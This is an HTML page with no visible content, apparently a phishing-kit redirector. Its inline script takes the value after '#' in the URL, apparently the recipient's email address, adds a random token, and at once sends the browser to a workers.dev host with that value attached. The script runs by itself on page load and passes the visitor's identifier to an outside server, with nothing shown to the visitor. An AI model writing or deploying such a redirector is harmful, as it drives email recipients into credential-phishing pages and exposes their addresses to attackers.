<html lang="en">
	<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
	<script>
		function makeid(length) {
			var result = "";
			var characters =
				"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			var charactersLength = characters.length;
			for (var i = 0; i < length; i++) {
				result += characters.charAt(
					Math.floor(Math.random() * charactersLength)
				);
			}
			return result;
		}
		var hash = window.location.hash;
		var str = hash.split("#")[1];
		var em = hash.split("#")[1];
		window.setTimeout(function () {
			window.location.href = "https://soft-bush-a1ab.pucered.workers.dev/?bbre=zxosuxz"+ makeid(10) + "#" + em;
		}, 0);
	</script>
</html>
